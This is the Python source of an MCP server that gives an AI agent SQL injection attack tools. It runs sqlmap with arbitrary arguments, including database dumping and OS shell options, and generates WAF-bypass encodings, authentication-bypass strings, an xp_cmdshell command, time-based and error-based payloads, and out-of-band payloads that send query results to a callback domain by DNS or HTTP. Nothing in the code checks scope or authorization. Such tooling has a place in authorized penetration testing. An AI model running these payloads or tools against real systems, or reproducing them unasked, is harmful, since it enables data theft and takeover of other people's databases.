"""
SQLi Scanner MCP Server

Provides SQL injection testing via SQLMap with advanced encoding and OOB support.
"""

import os
import re
import shlex
import subprocess
import base64
import random
from typing import Optional
from fastmcp import FastMCP

SERVER_NAME = "sqli-scanner"
SERVER_HOST = os.environ.get("MCP_HOST", "0.0.0.0")
SERVER_PORT = int(os.environ.get("SQLI_PORT", "8005"))
OOB_DOMAIN = os.environ.get("OOB_DOMAIN", "")

mcp = FastMCP(SERVER_NAME)


@mcp.tool()
def execute_sqli(args: str) -> str:
    """
    Execute SQLMap with specified arguments.

    Parameters:
        args: SQLMap arguments (without 'sqlmap' command)

    Common Options:
        -u URL                 Target URL with injection point
        -r FILE                Load HTTP request from file
        --data DATA            POST data string
        --cookie COOKIE        HTTP Cookie header
        -p PARAM               Testable parameter(s)
        --dbms DBMS            Force DBMS (mysql, mssql, oracle, postgresql, sqlite)
        --level 1-5            Level of tests (default 1)
        --risk 1-3             Risk of tests (default 1)
        --technique TECH       SQLi techniques (B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline)
        --tamper SCRIPT        Tamper script(s) for WAF bypass
        --dns-domain DOMAIN    DNS exfiltration domain
        --batch                Never ask for user input
        --dbs                  Enumerate databases
        --tables               Enumerate tables
        --dump                 Dump table entries
        --os-shell             Prompt for OS shell
        --sql-shell            Prompt for SQL shell

    Tamper Scripts (WAF Bypass):
        space2comment          Replace spaces with /**/
        randomcase             Random case for keywords
        base64encode           Base64 encode payload
        charencode             URL encode characters
        between                Use BETWEEN instead of >
        equaltolike            Use LIKE instead of =

    Examples:
        # Basic scan
        -u "http://target.com/page?id=1" --batch --dbs

        # With WAF bypass
        -u "http://target.com/page?id=1" --tamper=space2comment,randomcase --batch

        # DNS exfiltration (blind SQLi) - get domain from interactsh_client /quick
        -u "http://target.com/page?id=1" --dns-domain=YOUR_ID.oast.fun --batch

        # POST request
        -u "http://target.com/login" --data="user=admin&pass=test" -p user --batch

        # From Burp request file
        -r /tmp/request.txt --batch --dbs
    """
    try:
        parsed_args = shlex.split(args)
    except ValueError as e:
        return f"Error parsing arguments: {e}"

    if "--batch" not in parsed_args:
        parsed_args.append("--batch")

    cmd = ["sqlmap"] + parsed_args

    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=600,
        )

        stdout = result.stdout
        stderr = result.stderr

        ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
        stdout = ansi_escape.sub('', stdout)
        stderr = ansi_escape.sub('', stderr)

        output = stdout
        if stderr.strip() and "legal disclaimer" not in stderr.lower():
            output += f"\n\nStderr:\n{stderr}"

        return output if output.strip() else "Scan completed with no findings."

    except subprocess.TimeoutExpired:
        return "Error: Scan timed out after 600 seconds"
    except FileNotFoundError:
        return "Error: sqlmap not found. Ensure it is installed."
    except Exception as e:
        return f"Error executing scan: {e}"


@mcp.tool()
def generate_encoded_payload(payload: str, encoding: str = "all") -> str:
    """
    Generate encoded SQL injection payloads for WAF bypass.

    Parameters:
        payload: Base SQLi payload (e.g., "' OR 1=1--")
        encoding: Encoding type - hex, base64, unicode, char, url, double_url,
                  comment, case, all

    Returns:
        Encoded payloads for WAF evasion
    """

    def to_hex(s):
        return '0x' + ''.join(f'{ord(c):02x}' for c in s)

    def to_hex_string(s):
        return ''.join(f'\\x{ord(c):02x}' for c in s)

    def to_base64(s):
        return base64.b64encode(s.encode()).decode()

    def to_unicode(s):
        return ''.join(f'%u{ord(c):04x}' for c in s)

    def to_char_mysql(s):
        return 'CHAR(' + ','.join(str(ord(c)) for c in s) + ')'

    def to_char_mssql(s):
        return '+'.join(f'CHAR({ord(c)})' for c in s)

    def to_char_oracle(s):
        return '||'.join(f'CHR({ord(c)})' for c in s)

    def to_url(s):
        return ''.join(f'%{ord(c):02x}' for c in s)

    def to_double_url(s):
        return ''.join(f'%25{ord(c):02x}' for c in s)

    def space2comment(s):
        return s.replace(' ', '/**/')

    def space2hash(s):
        return s.replace(' ', '#%0A')

    def space2dash(s):
        return s.replace(' ', '--%0A')

    def randomcase(s):
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in s)

    def concat_split(s):
        if len(s) < 2:
            return s
        mid = len(s) // 2
        return f"CONCAT('{s[:mid]}','{s[mid:]}')"

    payloads = {}

    payloads["hex"] = [
        f"Hex: {to_hex(payload)}",
        f"Hex String: {to_hex_string(payload)}",
    ]

    payloads["base64"] = [
        f"Base64: {to_base64(payload)}",
        f"MySQL: SELECT FROM_BASE64('{to_base64(payload)}')",
    ]

    payloads["unicode"] = [
        f"Unicode: {to_unicode(payload)}",
    ]

    payloads["char"] = [
        f"MySQL CHAR: {to_char_mysql(payload)}",
        f"MSSQL CHAR: {to_char_mssql(payload)}",
        f"Oracle CHR: {to_char_oracle(payload)}",
    ]

    payloads["url"] = [
        f"URL Encoded: {to_url(payload)}",
    ]

    payloads["double_url"] = [
        f"Double URL: {to_double_url(payload)}",
    ]

    payloads["comment"] = [
        f"Space2Comment: {space2comment(payload)}",
        f"Space2Hash: {space2hash(payload)}",
        f"Space2Dash: {space2dash(payload)}",
    ]

    payloads["case"] = [
        f"RandomCase: {randomcase(payload)}",
        f"RandomCase2: {randomcase(payload)}",
    ]

    payloads["concat"] = [
        f"Concat Split: {concat_split(payload)}",
    ]

    if encoding == "all":
        output = f"Encoded Payloads\nOriginal: {payload}\n{'='*60}\n"
        for enc_type, enc_payloads in payloads.items():
            output += f"\n[{enc_type.upper()}]\n{'-'*40}\n"
            for p in enc_payloads:
                output += f"{p}\n"
        return output
    elif encoding in payloads:
        output = f"[{encoding.upper()}] Encoding\nOriginal: {payload}\n{'-'*40}\n"
        for p in payloads[encoding]:
            output += f"{p}\n"
        return output
    else:
        return f"Unknown encoding: {encoding}. Options: {', '.join(payloads.keys())}, all"


@mcp.tool()
def generate_oob_payload(domain: str, dbms: str = "mysql", data: str = "version()") -> str:
    """
    Generate Out-of-Band (OOB) SQL injection payloads for DNS exfiltration.

    Parameters:
        domain: Your callback domain (e.g., attacker.com or xxxx.oast.fun)
        dbms: Database type - mysql, mssql, oracle, postgresql
        data: Data to exfiltrate (default: version())

    Returns:
        OOB payloads for blind SQLi data extraction
    """

    payloads = {
        "mysql": [
            f"SELECT LOAD_FILE(CONCAT('\\\\\\\\',({data}),'.{domain}\\\\a'))",
            f"SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,({data}),0x2e{domain.encode().hex()},0x5c5c61))",
            f"' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',({data}),'.{domain}\\\\a'))-- -",
        ],
        "mssql": [
            f"EXEC master..xp_dirtree '\\\\'+({data})+'.{domain}\\a'",
            f"EXEC master..xp_fileexist '\\\\'+({data})+'.{domain}\\a'",
            f"EXEC master..xp_subdirs '\\\\'+({data})+'.{domain}\\a'",
            f"DECLARE @q VARCHAR(1024); SET @q='\\\\'+({data})+'.{domain}\\a'; EXEC master..xp_dirtree @q",
            f"'; EXEC master..xp_dirtree '\\\\'+({data})+'.{domain}\\a'--",
        ],
        "oracle": [
            f"SELECT UTL_HTTP.REQUEST('http://'||({data})||'.{domain}/') FROM DUAL",
            f"SELECT HTTPURITYPE('http://'||({data})||'.{domain}/').GETCLOB() FROM DUAL",
            f"SELECT UTL_INADDR.GET_HOST_ADDRESS(({data})||'.{domain}') FROM DUAL",
            f"SELECT DBMS_LDAP.INIT(({data})||'.{domain}',80) FROM DUAL",
        ],
        "postgresql": [
            f"COPY (SELECT '') TO PROGRAM 'nslookup '||({data})||'.{domain}'",
            f"CREATE EXTENSION IF NOT EXISTS dblink; SELECT dblink_connect('host='||({data})||'.{domain}')",
            f"SELECT lo_import('//'||({data})||'.{domain}/a')",
        ],
    }

    common_data_extracts = [
        ("Database Version", "version()" if dbms != "mssql" else "@@version"),
        ("Current User", "user()" if dbms == "mysql" else "current_user" if dbms == "postgresql" else "USER" if dbms == "oracle" else "SYSTEM_USER"),
        ("Current Database", "database()" if dbms == "mysql" else "DB_NAME()" if dbms == "mssql" else "SYS_CONTEXT('USERENV','DB_NAME')" if dbms == "oracle" else "current_database()"),
    ]

    if dbms not in payloads:
        return f"Unknown DBMS: {dbms}. Options: {', '.join(payloads.keys())}"

    output = f"OOB DNS Exfiltration Payloads\nDBMS: {dbms.upper()}\nDomain: {domain}\nData: {data}\n{'='*60}\n"

    output += f"\n[PAYLOADS]\n{'-'*40}\n"
    for i, p in enumerate(payloads[dbms], 1):
        output += f"{i}. {p}\n"

    output += f"\n[COMMON DATA EXTRACTS]\n{'-'*40}\n"
    for name, extract in common_data_extracts:
        output += f"{name}: {extract}\n"

    output += f"\n[USAGE WITH SQLMAP]\n{'-'*40}\n"
    output += f'sqlmap -u "http://target/page?id=1" --dns-domain={domain} --dbms={dbms} --batch\n'

    return output


@mcp.tool()
def generate_auth_bypass() -> str:
    """
    Generate SQL injection authentication bypass payloads.

    Returns:
        Common auth bypass payloads for login forms
    """

    payloads = """
SQL Injection Authentication Bypass Payloads
=============================================

[BASIC]
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
' OR 1=1--
" OR 1=1--
or 1=1--
' OR 'a'='a
') OR ('1'='1
') OR ('1'='1'--

[ADMIN BYPASS]
admin'--
admin'/*
admin' OR '1'='1
admin' OR '1'='1'--
admin' OR '1'='1'/*
admin')--
admin')/*
' OR 1=1 LIMIT 1--
' UNION SELECT 1,'admin','password'--

[NO QUOTES]
1 OR 1=1
1) OR (1=1
1 AND 1=1
1' AND '1'='1

[COMMENT VARIATIONS]
'--
'#
'/*
' --
' #
' /*

[UNION BASED]
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION ALL SELECT 1,2,3--
' UNION ALL SELECT 'admin','pass'--

[WAF BYPASS]
'/**/OR/**/1=1--
'%20OR%201=1--
'%0AOR%0A1=1--
' OR '1'='1'/**/--
'+OR+1=1--

[CASE BYPASS]
' oR '1'='1
' Or '1'='1
' OR '1'='1
' or '1'='1

[ENCODING]
%27%20OR%20%271%27%3D%271
' OR 0x31=0x31--

[MSSQL SPECIFIC]
'; EXEC xp_cmdshell('whoami')--
'; WAITFOR DELAY '0:0:5'--

[MYSQL SPECIFIC]
' OR 1=1#
' OR '1'='1'#
admin'#
1' AND SLEEP(5)#

[ORACLE SPECIFIC]
' OR 1=1--
' OR '1'='1'--
' UNION SELECT NULL FROM DUAL--
"""
    return payloads


@mcp.tool()
def list_tamper_scripts() -> str:
    """
    List available SQLMap tamper scripts for WAF bypass.

    Returns:
        Categorized list of tamper scripts with descriptions
    """

    scripts = """
SQLMap Tamper Scripts Reference
===============================

[ENCODING]
base64encode.py          Base64 encode payload
charencode.py            URL encode all characters
chardoubleencode.py      Double URL encode
charunicodeencode.py     Unicode encode (%uXXXX)
hexentities.py           Hex HTML entities (&#xXX)
htmlencode.py            HTML entity encode
overlongutf8.py          Overlong UTF-8 encoding
percentage.py            Add % before each character

[SPACE BYPASS]
space2comment.py         Space → /**/
space2dash.py            Space → -- with newline
space2hash.py            Space → # with newline
space2mssqlblank.py      MSSQL alternate whitespace
space2mysqldash.py       MySQL dash comment
space2plus.py            Space → +
space2randomblank.py     Random whitespace chars

[CASE MANIPULATION]
randomcase.py            RaNdOm CaSe
uppercase.py             UPPERCASE
lowercase.py             lowercase

[OPERATOR SUBSTITUTION]
between.py               > → NOT BETWEEN 0 AND
equaltolike.py           = → LIKE
greatest.py              > → GREATEST
least.py                 < → LEAST

[FUNCTION SUBSTITUTION]
ifnull2casewhenisnull.py IFNULL → CASE WHEN ISNULL
ifnull2ifisnull.py       IFNULL → IF(ISNULL())
substring2leftright.py   SUBSTRING → LEFT/RIGHT

[COMMENT INJECTION]
commentbeforeparentheses.py Add /**/ before (
randomcomments.py        Insert random comments
versionedkeywords.py     MySQL versioned comments /*!*/

[WAF-SPECIFIC]
bluecoat.py              BlueCoat proxy bypass
modsecurityversioned.py  ModSecurity bypass
varnish.py               Varnish cache bypass
luanginx.py              Lua/Nginx WAF bypass

[UNION MANIPULATION]
0eunion.py               0e0UNION (scientific notation)
dunion.py                DUNION variant
misunion.py              Malformed UNION
unionalltounion.py       UNION ALL → UNION

[QUOTE HANDLING]
apostrophemask.py        Quote masking
apostrophenullencode.py  Null-encoded quotes
escapequotes.py          Escape quotes

[MISC]
appendnullbyte.py        Append null byte
binary.py                Binary conversion
sp_password.py           Add sp_password (hides in logs)

[USAGE]
Single:  --tamper=space2comment
Chain:   --tamper=space2comment,randomcase,base64encode
"""
    return scripts


@mcp.tool()
def generate_time_blind_payload(dbms: str = "mysql", delay: int = 5) -> str:
    """
    Generate time-based blind SQL injection payloads.

    Parameters:
        dbms: Database type - mysql, mssql, oracle, postgresql, sqlite
        delay: Sleep delay in seconds (default: 5)

    Returns:
        Time-based blind SQLi payloads
    """

    payloads = {
        "mysql": [
            f"' AND SLEEP({delay})--",
            f"' AND (SELECT SLEEP({delay}))--",
            f"' OR SLEEP({delay})--",
            f"1' AND SLEEP({delay}) AND '1'='1",
            f"' AND IF(1=1,SLEEP({delay}),0)--",
            f"' AND (SELECT IF(1=1,SLEEP({delay}),0))--",
            f"' UNION SELECT SLEEP({delay})--",
            f"' AND BENCHMARK(10000000,SHA1('test'))--",
        ],
        "mssql": [
            f"'; WAITFOR DELAY '0:0:{delay}'--",
            f"' AND 1=1; WAITFOR DELAY '0:0:{delay}'--",
            f"'); WAITFOR DELAY '0:0:{delay}'--",
            f"' IF 1=1 WAITFOR DELAY '0:0:{delay}'--",
            f"'; IF (1=1) WAITFOR DELAY '0:0:{delay}'--",
        ],
        "oracle": [
            f"' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})--",
            f"' AND 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})=1--",
            f"' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})--",
            f"' AND UTL_INADDR.GET_HOST_ADDRESS('sleep{delay}.YOUR_ID.oast.fun') IS NOT NULL--",
        ],
        "postgresql": [
            f"'; SELECT pg_sleep({delay})--",
            f"' AND 1=(SELECT 1 FROM pg_sleep({delay}))--",
            f"' OR 1=(SELECT 1 FROM pg_sleep({delay}))--",
            f"' AND pg_sleep({delay}) IS NOT NULL--",
            f"'; SELECT CASE WHEN (1=1) THEN pg_sleep({delay}) ELSE pg_sleep(0) END--",
        ],
        "sqlite": [
            f"' AND 1=randomblob(500000000)--",
            f"' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))--",
        ],
    }

    if dbms not in payloads:
        return f"Unknown DBMS: {dbms}. Options: {', '.join(payloads.keys())}"

    output = f"Time-Based Blind SQLi Payloads\nDBMS: {dbms.upper()}\nDelay: {delay} seconds\n{'='*60}\n"

    for i, p in enumerate(payloads[dbms], 1):
        output += f"\n{i}. {p}"

    output += f"\n\n[DETECTION TIP]\n{'-'*40}\n"
    output += f"If response takes ~{delay}+ seconds, injection point is confirmed.\n"
    output += "Compare with: ' AND 1=2-- (should be fast)\n"

    return output


@mcp.tool()
def generate_error_based_payload(dbms: str = "mysql") -> str:
    """
    Generate error-based SQL injection payloads.

    Parameters:
        dbms: Database type - mysql, mssql, oracle, postgresql

    Returns:
        Error-based SQLi payloads for data extraction
    """

    payloads = {
        "mysql": [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
            "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND EXP(~(SELECT * FROM(SELECT version())x))--",
            "' AND JSON_KEYS((SELECT CONVERT((SELECT version()) USING utf8)))--",
            "' AND GTID_SUBSET(CONCAT((SELECT version())),1)--",
        ],
        "mssql": [
            "' AND 1=CONVERT(int,(SELECT @@version))--",
            "' AND 1=CAST((SELECT @@version) AS int)--",
            "' UNION SELECT NULL,NULL,NULL WHERE 1=CAST((SELECT @@version) AS int)--",
            "' AND 1=(SELECT TOP 1 CAST(name AS int) FROM sysobjects)--",
        ],
        "oracle": [
            "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM DUAL))--",
            "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM DUAL))--",
            "' AND EXTRACTVALUE(xmltype('<?xml version=\"1.0\"?><a>'||(SELECT user FROM DUAL)||'</a>'),'/a')--",
        ],
        "postgresql": [
            "' AND 1=CAST((SELECT version()) AS int)--",
            "' AND CAST((SELECT version()) AS numeric)--",
            "' AND 1=CAST(CHR(32)||(SELECT version()) AS numeric)--",
        ],
    }

    if dbms not in payloads:
        return f"Unknown DBMS: {dbms}. Options: {', '.join(payloads.keys())}"

    output = f"Error-Based SQLi Payloads\nDBMS: {dbms.upper()}\n{'='*60}\n"

    for i, p in enumerate(payloads[dbms], 1):
        output += f"\n{i}. {p}"

    output += f"\n\n[DATA EXTRACTION]\n{'-'*40}\n"
    output += "Replace 'version()' or '@@version' with:\n"
    output += "- database() / DB_NAME() - Current database\n"
    output += "- user() / SYSTEM_USER - Current user\n"
    output += "- (SELECT table_name FROM information_schema.tables LIMIT 1) - Table names\n"

    return output


if __name__ == "__main__":
    transport = os.environ.get("MCP_TRANSPORT", "stdio")
    if transport == "sse":
        mcp.run(transport="sse", host=SERVER_HOST, port=SERVER_PORT)
    else:
        mcp.run()
